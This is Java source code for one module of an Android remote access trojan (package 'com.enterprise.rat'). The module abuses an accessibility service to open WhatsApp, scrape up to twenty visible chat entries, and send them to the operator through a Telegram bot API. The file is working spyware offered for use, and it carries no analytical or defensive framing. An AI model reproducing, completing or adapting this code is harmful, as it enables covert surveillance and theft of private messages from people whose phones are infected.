package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.view.accessibility.AccessibilityNodeInfo;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;
import java.util.List;

public class WhatsAppReaderManager {
    private Context context;
    public WhatsAppReaderManager(Context context) { this.context = context; }

    public void readChats() {
        AccessibilityService svc = AccessibilityService.getInstance();
        if (svc == null) { TelegramApi.sendMessage("❌ Accessibility not active."); return; }
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("https://wa.me/"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Thread.sleep(3000);

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                AccessibilityNodeInfo root = svc.getRootInActiveWindow();
                if (root != null) {
                    StringBuilder sb = new StringBuilder("<b>💬 WhatsApp Visible Chats</b>\n\n");
                    List<AccessibilityNodeInfo> chatItems = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/contact_row_container");
                    if (chatItems.isEmpty()) chatItems = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/chat_row");
                    int count = 0;
                    for (AccessibilityNodeInfo item : chatItems) {
                        if (count >= 20) break;
                        String text = item.getText() != null ? item.getText().toString() : "";
                        String desc = item.getContentDescription() != null ? item.getContentDescription().toString() : "";
                        if (!text.isEmpty()) sb.append("<b>").append(text).append("</b>\n");
                        if (!desc.isEmpty()) sb.append("<i>").append(desc).append("</i>\n");
                        sb.append("---\n");
                        count++;
                        item.recycle();
                    }
                    root.recycle();
                    TelegramApi.sendMessage(sb.toString());
                } else {
                    TelegramApi.sendMessage("⚠ WhatsApp window not detected.");
                }
            }, 2500);
            TelegramApi.sendMessage("📲 Reading WhatsApp chats...");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ WhatsApp error: " + e.getMessage());
        }
    }
}
